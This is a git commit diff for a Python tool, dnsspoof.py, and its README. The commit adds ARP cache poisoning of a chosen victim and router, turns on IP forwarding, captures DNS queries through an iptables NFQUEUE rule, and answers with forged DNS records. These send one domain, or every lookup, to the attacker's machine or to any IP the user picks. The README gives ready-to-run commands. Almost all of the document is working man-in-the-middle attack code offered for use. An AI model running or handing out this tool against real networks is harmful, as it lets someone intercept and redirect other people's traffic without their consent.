a585300ef228bea45ea06530d3563ca2d08a2a3d
DanMcInerney <danhmcinerney@gmail.com>
2014-01-06 03:15:49 -0500

    Added ARP spoofing, added option to spoof all DNS requests and another to specify where you want to redirect them to

--- README.md
+++ README.md
@@ -2,3 +2,48 @@ dnsspoof
 ========
 
 DNS spoofer. Drops DNS responses from the router and replaces it with the spoofed DNS response
+
+dnsspoof.py
+
+Usage:
+
+'''shell
+python dnsspoof.py -r 192.168.0.1 -v 192.168.0.5 -d domaintospoof.com
+'''
+
+Spoof domaintospoof.com to point back to the attack's machine.
+
+
+'''shell
+python dnsspoof.py -r 192.168.0.1 -v 192.168.0.5 -a -t 80.87.128.67
+'''
+
+Spoof all DNS lookup requests to point to 80.87.128.67 (stallman.org). One can also use the -t option with the -d option to redirect just a specific domain to a specific IP rather than redirecting that domain to the attacker's machine.
+
+
+License
+-------
+
+Copyright (c) 2013, Dan McInerney
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+* Neither the name of the Dan McInerney nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
+DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
+ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+
+-------
+danmcinerney.org
--- dnsspoof.py
+++ dnsspoof.py
@@ -1,53 +1,125 @@
-#!/usr/bin/python
-
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
-conf.verb=0
-#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
-#conf.checkIPaddr=0
-import argparse
-import nfqueue
+from twisted.internet import reactor
+from twisted.internet.interfaces import IReadDescriptor
 import os
+import nfqueue
+from scapy.all import *
+import argparse
+import threading
+import signal
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
-args = parser.parse_args()
-localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
+def arg_parser():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d facebook.com")
+    parser.add_argument("-r", "--routerIP", help="Choose the router IP. Example: -r 192.168.0.1")
+    parser.add_argument("-v", "--victimIP", help="Choose the victim IP. Example: -v 192.168.0.5")
+    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected otherwise defaults to attacker's local IP. Requires either the -d or -a argument. Example: -t 80.87.128.67")
+    parser.add_argument("-a", "--spoofall", help="Spoof all DNS requests back to the attacker or use -r to specify an IP to redirect them to", action="store_true")
+    return parser.parse_args()
 
-def dnsspoof_cb(payload):
-	data = payload.get_data()
-	pkt = IP(data)
-	ip_layer = pkt[IP]
-	dns_layer = pkt[DNS]
-	if not pkt.haslayer(DNSQR):
-		payload.set_verdict(nfqueue.NF_ACCEPT)
-	else:
-		print pkt[DNS].qd.qname
-		if args.dnsspoof in pkt[DNS].qd.qname:
-			print '[+] DNS request for %s found' % args.dnsspoof
-			payload.set_verdict(nfqueue.NF_DROP)
-			print '[+] Dropped real DNS response. Injecting the spoofed packet...'
-			p = IP(dst=ip_layer.src, src=ip_layer.dst)/UDP(dport=ip_layer.sport, sport=ip_layer.dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=localIP))
-			send(p)
-			print '[+] Sent spoofed packet for %s' % args.dnsspoof
+def originalMAC(ip):
+    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
+    for s,r in ans:
+        return r[Ether].src
 
-def main():
-	print '[*] Setting up iptables and starting the queue'
-#	iptables -A OUTPUT just catches packets on the attacker's machine, -t nat -A PREROUTING just catches the victim
-	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
-	q = nfqueue.queue()
-	q.open()
-	q.bind(socket.AF_INET)
-	q.set_callback(dnsspoof_cb)
-	q.create_queue(0)
-	try:
-		q.try_run()
-	except KeyboardInterrupt:
-		print "Exiting..."
-		os.system('iptables -F')
-		q.unbind(socket.AF_INET)
-		q.close()
-		sys.exit('Exited')
+def poison(routerIP, victimIP, routerMAC, victimMAC):
+    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
 
-main()
+def restore(routerIP, victimIP, routerMAC, victimMAC):
+    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
+    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+    sys.exit(0)
+
+def cb(payload):
+    data = payload.get_data()
+    pkt = IP(data)
+    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
+    if not pkt.haslayer(DNSQR):
+        payload.set_verdict(nfqueue.NF_ACCEPT)
+    else:
+        if arg_parser().spoofall:
+            if not arg_parser().redirectto:
+                spoofed_pkt(payload, pkt, localIP)
+            else:
+                spoofed_pkt(payload, pkt, arg_parser().redirectto)
+        if arg_parser().domain:
+            if arg_parser().domain in pkt[DNS].qd.qname:
+                if not arg_parser().redirectto:
+                    spoofed_pkt(payload, pkt, localIP)
+                else:
+                    spoofed_pkt(payload, pkt, arg_parser().redirectto)
+
+def spoofed_pkt(payload, pkt, rIP):
+    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
+    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+    print '[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1]
+
+class Queued(object):
+    def __init__(self):
+        self.q = nfqueue.queue()
+        self.q.set_callback(cb)
+        self.q.fast_open(0, socket.AF_INET)
+        self.q.set_queue_maxlen(5000)
+        reactor.addReader(self)
+        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
+        print '[*] Waiting for data'
+    def fileno(self):
+        return self.q.get_fd()
+    def doRead(self):
+        self.q.process_pending(100)
+    def connectionLost(self, reason):
+        reactor.removeReader(self)
+    def logPrefix(self):
+        return 'queue'
+
+def main(args):
+    global victimMAC, routerMAC
+
+    if os.geteuid() != 0:
+        sys.exit("[!] Please run as root")
+
+    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
+
+    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+    ipf_read = ipf.read()
+    if ipf_read != '1\n':
+        ipf.write('1\n')
+    ipf.close()
+
+    print '[*] iptables queue started and IP forwarding enabled'
+
+    routerMAC = originalMAC(args.routerIP)
+    victimMAC = originalMAC(args.victimIP)
+    if routerMAC == None:
+        sys.exit("Could not find router MAC address. Closing....")
+    if victimMAC == None:
+        sys.exit("Could not find victim MAC address. Closing....")
+    print '[*] Router MAC:',routerMAC
+    print '[*] Victim MAC:',victimMAC
+
+    Queued()
+    rctr = threading.Thread(target=reactor.run, args=(False,))
+    rctr.daemon = True
+    rctr.start()
+
+    def signal_handler(signal, frame):
+        print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
+            forward.write(ipf_read)
+        restore(args.routerIP, args.victimIP, routerMAC, victimMAC)
+        restore(args.routerIP, args.victimIP, routerMAC, victimMAC)
+        os.system('/sbin/iptables -F')
+        os.system('/sbin/iptables -X')
+        os.system('/sbin/iptables -t nat -F')
+        os.system('/sbin/iptables -t nat -X')
+        sys.exit(0)
+    signal.signal(signal.SIGINT, signal_handler)
+
+    while 1:
+        poison(args.routerIP, args.victimIP, routerMAC, victimMAC)
+        time.sleep(1.5)
+
+main(arg_parser())
